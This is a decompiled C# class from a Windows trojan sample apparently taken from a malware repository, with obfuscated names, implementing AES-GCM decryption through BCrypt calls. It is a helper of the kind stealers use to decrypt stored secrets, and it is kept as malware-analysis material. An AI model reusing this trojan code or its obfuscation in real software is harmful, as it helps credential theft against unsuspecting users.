// Decompiled with JetBrains decompiler
// Type: ،R皍Ȩ.Ł̲åζ
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-871a0b2fa5664bd5ed819edb7c037b81b2b552e4ab9eec6f87adbf32d51365ef.exe

using \uFFFD嵱հ\u002Dζ;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace \u0089\u060CR皍Ȩ
{
  internal class \u0097Ł̲åζ
  {
    public byte[] \uFFFDΑôƌ̆(
      byte[] _param1,
      byte[] _param2,
      byte[] _param3,
      byte[] _param4,
      byte[] _param5)
    {
      IntPtr num1 = this.\u0089թіӓ\uFFFD(tΠیչ\uFFFD.\uFFFD\u0040ۨęڿ, tΠیչ\uFFFD.k콪\u05C3ܣ\u1CFC, tΠیչ\uFFFD.ջױ\uFFFD\uFFFDW);
      IntPtr num2;
      IntPtr hglobal = this.չΑë\uFFFD\uFFFD(num1, _param1, out num2);
      tΠیչ\uFFFD.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authenticatedCipherModeInfo = new tΠیչ\uFFFD.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(_param2, _param3, _param5);
      byte[] numArray1;
      using (authenticatedCipherModeInfo)
      {
        byte[] numArray2 = new byte[checked (this.\uFFFDή\uFFFD̲\u07B8(num1) - 1 + 1)];
        int num3 = 0;
        uint num4 = tΠیչ\uFFFD.Z\uFFFD콪\u07B4ϫ(num2, _param4, _param4.Length, ref authenticatedCipherModeInfo, numArray2, numArray2.Length, (byte[]) null, 0, ref num3, 0);
        if (num4 > 0U)
          throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", (object) num4));
        numArray1 = new byte[checked (num3 - 1 + 1)];
        uint num5 = tΠیչ\uFFFD.Z\uFFFD콪\u07B4ϫ(num2, _param4, _param4.Length, ref authenticatedCipherModeInfo, numArray2, numArray2.Length, numArray1, numArray1.Length, ref num3, 0);
        if ((int) num5 == (int) tΠیչ\uFFFD.BҟņՄϒ)
          throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
        if (num5 > 0U)
          throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", (object) num5));
      }
      int num6 = (int) tΠیչ\uFFFD.恁ݶ\uFFFDܹԜ(num2);
      Marshal.FreeHGlobal(hglobal);
      int num7 = (int) tΠیչ\uFFFD.ԹҚ\u05C9éœ(num1, 0U);
      return numArray1;
    }

    private int \uFFFDή\uFFFD̲\u07B8(IntPtr _param1)
    {
      byte[] numArray = this.\uFFFDᔖɩ\uFFFDm(_param1, tΠیչ\uFFFD.뫆恁\uFFFDչ\uFFFD);
      return BitConverter.ToInt32(new byte[4]
      {
        numArray[4],
        numArray[5],
        numArray[6],
        numArray[7]
      }, 0);
    }

    private IntPtr \u0089թіӓ\uFFFD(string _param1, string _param2, string _param3)
    {
      IntPtr Ī2ٕųԜ = IntPtr.Zero;
      uint num1 = tΠیչ\uFFFD.ڿіޤ\u05C9Ԍ(out Ī2ٕųԜ, _param1, _param2, 0U);
      if (num1 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", (object) num1));
      byte[] bytes = Encoding.Unicode.GetBytes(_param3);
      uint num2 = tΠیչ\uFFFD.ãݶӛ\u26CAε(Ī2ٕųԜ, tΠیչ\uFFFD.ΩǎKȨt, bytes, bytes.Length, 0);
      if (num2 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", (object) num2));
      return Ī2ٕųԜ;
    }

    private IntPtr չΑë\uFFFD\uFFFD(IntPtr _param1, byte[] _param2, out IntPtr _param3)
    {
      int int32 = BitConverter.ToInt32(this.\uFFFDᔖɩ\uFFFDm(_param1, tΠیչ\uFFFD.Ś\uFFFDިãŎ), 0);
      IntPtr ϫҟמņœ = Marshal.AllocHGlobal(int32);
      byte[] numArray = this.뜸뜸ҏ\u26CA츠(tΠیչ\uFFFD.\uFFFDƉ\uFFFD\uFFFD\u07B9, BitConverter.GetBytes(1), BitConverter.GetBytes(_param2.Length), _param2);
      uint num = tΠیչ\uFFFD.䇹\uFFFDi恁\uFFFD(_param1, IntPtr.Zero, tΠیչ\uFFFD.\u060C\uFFFDW\u02F3ܣ, out _param3, ϫҟמņœ, int32, numArray, numArray.Length, 0U);
      if (num > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", (object) num));
      return ϫҟמņœ;
    }

    private byte[] \uFFFDᔖɩ\uFFFDm(IntPtr _param1, string _param2)
    {
      int num1 = 0;
      uint num2 = tΠیչ\uFFFD.\u0040KΑߡB(_param1, _param2, (byte[]) null, 0, ref num1, 0U);
      if (num2 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", (object) num2));
      byte[] numArray = new byte[checked (num1 - 1 + 1)];
      uint num3 = tΠیչ\uFFFD.\u0040KΑߡB(_param1, _param2, numArray, numArray.Length, ref num1, 0U);
      if (num3 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", (object) num3));
      return numArray;
    }

    public byte[] 뜸뜸ҏ\u26CA츠(params byte[][] _param1)
    {
      int num = 0;
      byte[][] numArray1 = _param1;
      int index1 = 0;
      while (index1 < numArray1.Length)
      {
        byte[] numArray2 = numArray1[index1];
        if (numArray2 != null)
          checked { num += numArray2.Length; }
        checked { ++index1; }
      }
      byte[] dst = new byte[checked (num - 1 + 1 - 1 + 1)];
      int dstOffset = 0;
      byte[][] numArray3 = _param1;
      int index2 = 0;
      while (index2 < numArray3.Length)
      {
        byte[] src = numArray3[index2];
        if (src != null)
        {
          Buffer.BlockCopy((Array) src, 0, (Array) dst, dstOffset, src.Length);
          checked { dstOffset += src.Length; }
        }
        checked { ++index2; }
      }
      return dst;
    }
  }
}
